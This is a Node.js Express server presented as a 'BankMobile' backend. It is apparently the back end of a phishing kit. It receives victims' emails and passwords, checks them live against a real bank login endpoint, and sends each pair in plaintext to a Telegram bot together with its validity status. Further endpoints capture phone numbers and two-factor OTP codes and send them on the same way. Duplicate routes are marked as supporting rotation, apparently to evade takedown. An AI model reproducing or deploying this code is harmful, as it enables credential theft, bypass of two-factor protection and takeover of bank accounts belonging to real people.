// ================================================
// BANKMOBILE - BACKEND (WITH ALL ENDPOINTS)
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3004;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ================================================
// CORS
// ================================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ================================================
// AUTHENTICATE
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);

        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        console.log(`Response status: ${response.status}`);

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }

        console.log('❌ FAILED');
        return { success: false };

    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// SHARED AUTH HANDLER
// ================================================
async function handleAuth(req, res) {
    const { email, password } = req.body;
    
    console.log(`\n🔐 Login attempt: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        const successMsg = `✅ <b>SUCCESS!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ✅ VALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(successMsg);
        console.log('✅ VALID');
        res.json({ success: true });
    } else {
        const failMsg = `❌ <b>FAILED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ❌ INVALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(failMsg);
        console.log('❌ INVALID');
        res.json({ success: false, error: 'Invalid credentials' });
    }
}

// ================================================
// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
// ================================================
app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// Also support /api/ versions
app.post('/api/authenticate', handleAuth);
app.post('/api/auth', handleAuth);
app.post('/api/verify', handleAuth);
app.post('/api/login', handleAuth);
app.post('/api/validate', handleAuth);

// ================================================
// OTHER ENDPOINTS
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: <code>${phone}</code>`);
    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: <code>${otp}</code>`);
    res.json({ success: true });
});

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

// ================================================
// ROOT
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Backend API',
        status: 'running',
        endpoints: {
            'POST /authenticate': 'Login',
            'POST /auth': 'Login',
            'POST /verify': 'Login',
            'POST /login': 'Login',
            'POST /validate': 'Login',
            'POST /submit-phone': 'Submit phone',
            'POST /submit-otp': 'Submit OTP',
            'GET /health': 'Health check'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Backend running on port ${PORT}`);
    console.log(`📨 Telegram: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}`);
});
